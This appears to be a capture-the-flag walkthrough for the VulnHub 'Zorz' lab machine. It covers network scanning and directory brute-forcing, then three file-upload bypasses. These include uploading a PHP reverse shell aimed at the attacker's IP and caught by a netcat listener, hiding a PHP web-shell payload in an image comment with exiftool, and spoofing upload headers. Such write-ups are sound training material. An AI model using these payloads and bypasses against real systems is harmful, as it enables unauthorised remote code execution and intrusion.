@@ -1,0 +1,292 @@
+URL : https://www.vulnhub.com/entry/tophatsec-zorz,117/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+
+ Currently scanning: 172.27.190.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 27 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 1620             
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 169.254.232.12  d4:93:98:a4:70:b8    01    060   Unknown vendor               
+ 10.207.45.133   d4:93:98:a4:70:b8    01    060   Unknown vendor               
+ 10.207.44.1     00:00:5e:00:01:02    17    1020   USC INFORMATION SCIENCES INST
+ 10.207.44.45    68:76:4f:89:15:13    02    120   Unknown vendor               
+ 10.207.44.2     00:0b:86:b4:c8:47    02    120   Aruba Networks               
+ 10.207.45.15    08:d4:0c:22:5c:ea    01    060   Unknown vendor               
+ 10.207.45.27    9c:6c:15:95:04:b6    02    120   Unknown vendor               
+ 10.207.44.30    08:00:27:9a:0d:2f    01    060   CADMUS COMPUTER SYSTEMS 
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 10.207.44.30
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-04 21:56 EDT
+Nmap scan report for 10.207.44.30
+Host is up (0.00075s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 48:bb:d8:38:b8:25:a6:6c:5e:7f:67:c9:ec:53:cc:ed (DSA)
+|   2048 ec:55:48:93:28:90:f6:bf:3c:cd:e3:90:42:26:3b:5d (RSA)
+|_  256 3f:0a:11:c9:59:73:be:df:f7:77:59:65:07:91:d7:d6 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=8/4%Time=55C16D63%P=i686-pc-linux-gnu%r(NULL,29
+SF:,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
+MAC Address: 08:00:27:9A:0D:2F (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.75 ms 10.207.44.30
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.42 seconds
+
+Level 1
+
+Enumerating port 80
+3.) Run nikto on the IP
+root@kali:~# nikto -h http://10.207.44.30/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.207.44.30
++ Target Hostname:    10.207.44.30
++ Target Port:        80
++ Start Time:         2015-08-04 22:08:11 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x16f 0x50f6739177444 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.6
++ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
++ OSVDB-3282: /uploader.php: This script may allow arbitrary files to be uploaded to the remote server.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 6744 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2015-08-04 22:09:01 (GMT-4) (50 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+4.) Open the IP address in the browser
+Open http://10.207.44.30/ in the browser
+Page source doesn't have any hints
+Try uploading a normal image
+After uploading a valid image this message is shown
+File is valid, and was successfully uploaded.
+
+Here is some more debugging info:Array
+(
+    [upfile] => Array
+        (
+            [name] => 123.png
+            [type] => image/png
+            [tmp_name] => /tmp/php3kkB6Q
+            [error] => 0
+            [size] => 93942
+        )
+
+)
+
+5.) Brute forcing the directories on the server
+root@kali:~# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.207.44.30/FUZZ
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://10.207.44.30/FUZZ
+Payload type: file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+Total requests: 220560
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00001:  C=200     15 L	      31 W	    367 Ch	  " - #"
+00002:  C=200     15 L	      31 W	    367 Ch	  " - # directory-list-2.3-medium.txt"
+00003:  C=200     15 L	      31 W	    367 Ch	  " - # Copyright 2007 James Fisher"
+00004:  C=200     15 L	      31 W	    367 Ch	  "on-Share Alike 3.0 License. To view a copy of this"
+00005:  C=200     15 L	      31 W	    367 Ch	  "sit http://creativecommons.org/licenses/by-sa/3.0/"
+00006:  C=200     15 L	      31 W	    367 Ch	  " - #"
+00008:  C=200     15 L	      31 W	    367 Ch	  "d a letter to Creative Commons, 171 Second Street,"
+00012:  C=200     15 L	      31 W	    367 Ch	  " - # on atleast 2 different hosts"
+00007:  C=200     15 L	      31 W	    367 Ch	  "# This work is licensed under the Creative Commons"
+00010:  C=200     15 L	      31 W	    367 Ch	  " Suite 300, San Francisco, California, 94105, USA."
+00011:  C=200     15 L	      31 W	    367 Ch	  "ered case sensative list, where entries were found"
+00009:  C=200     15 L	      31 W	    367 Ch	  " - #"
+00014:  C=200     15 L	      31 W	    367 Ch	  " - "
+00020:  C=200     15 L	      31 W	    367 Ch	  " - #"
+01082:  C=301      9 L	      28 W	    316 Ch	  " - javascript"
+10803:  C=301      9 L	      28 W	    316 Ch	  " - phpmyadmin"
+45133:  C=200     15 L	      31 W	    367 Ch	  " - "
+57039:  C=301      9 L	      28 W	    314 Ch	  " - uploads2"
+Stopping...
+By browsing to http://10.207.44.30/uploads2/ we see nothing
+Try accessing the directory http://10.207.44.30/uploads1/ instead
+Out file exits here
+
+6.) Upload reverse shell
+We will upload PHP reverse shell by pentestmonkey
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+We need to change the IP address in the shell to our IP
+$ip = '10.207.44.186';  // CHANGE THIS
+Open http://10.207.44.30/ in the browser
+Upload php-reverse-shell.php
+Page shows
+File is valid, and was successfully uploaded.
+
+Here is some more debugging info:Array
+(
+    [upfile] => Array
+        (
+            [name] => php-reverse-shell.php
+            [type] => application/x-php
+            [tmp_name] => /tmp/phpW8jSgb
+            [error] => 0
+            [size] => 5495
+        )
+
+)
+
+7.) Access the reverse shell
+Set up a handler
+root@kali:~# nc -v -n -l -p 1234
+listening on [any] 1234 ...
+Go to the page http://10.207.44.30/uploads1/ and click on the php-reverse-shell.php
+Shell is invoked
+root@kali:~# nc -v -n -l -p 1234
+listening on [any] 1234 ...
+connect to [10.207.44.186] from (UNKNOWN) [10.207.44.30] 40997
+Linux zorz 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
+ 22:34:27 up 50 min,  0 users,  load average: 0.09, 0.10, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ whoami
+www-data
+$ cd var 
+$ ls
+backups
+cache
+lib
+local
+lock
+log
+mail
+opt
+run
+spool
+tmp
+www
+$ cd www
+$ ls
+html
+$ cd html
+$ ls -la
+total 48
+drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .
+drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..
+-rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html
+-rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html
+drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery
+drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+-rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php
+-rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php
+-rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php
+drwxr-xr-x 2 www-data www-data 4096 Aug  4 22:25 uploads1
+drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 uploads2
+drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3
+$ cd l337saucel337
+$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Feb 18 22:45 .
+drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+-rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE
+$ cat SECRETFILE
+Great job so far. This box has 3 uploaders.
+
+The first 2 are pure php, the last one is php w/jquery.
+
+To get credit for this challenge, please submit a write-up or instructions
+on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+of the uploader challenges, feel free to shoot me an email and let me know!
+
+admin@top-hat-sec.com
+
+Thanks for playing!
+http://www.top-hat-sec.com
+$ 
+So we solved 1
+
+Level 2
+
+8.) Go to Level 2
+Go to http://10.207.44.30/ and we are greeted with level 2
+Try uploading the pentestmonkey's php-reverse-shell but this time it fails and gives us the message
+File is not an image.Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded. 
+
+9.) Add comments in the image using exiftool and upload
+root@kali:~/Desktop/Z0Z# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exif_mod.png 
+    1 image files updated
+root@kali:~/Desktop/Z0Z# ls
+123.png  exif_mod.png  exif_mod.png_original  php-reverse-shell.php
+Now rename the file and try uploading
+root@kali:~/Desktop/Z0Z# cp exif_mod.png exif_mod.php.png
+root@kali:~/Desktop/Z0Z# ls
+123.png  exif_mod.php.png  exif_mod.png  exif_mod.png_original  php-reverse-shell.php
+Go to http://10.207.44.30/ and upload exif_mod.php.png
+The image was successfully uploaded
+Success! image/png.The file exif_mod.php.png has been uploaded. 
+Now try accessing the shell using http://10.207.44.30/uploads2/exif_mod.php.png?cmd=id
+The page shows
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+So we solved 2
+
+10.) Go to Level 3
+http://10.207.44.30/jQuery/upload.php
+We upload the pentestmonkey's php-reverse-shell but when uploading we change the following parameters in burpsuite
+Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php.jpg"
+Content-Type: image/jpeg
+We have successfully uploaded the shell
+Your File Uploaded Succesfully...!!
+
+File Name: php-reverse-shell.php.jpg
+Type: image/jpeg
+Size: 5.3662109375 kB
+Temp file: /tmp/phpfi8Rni
+Stored in: uploads3/php-reverse-shell.php.jpg
+So we solved 3
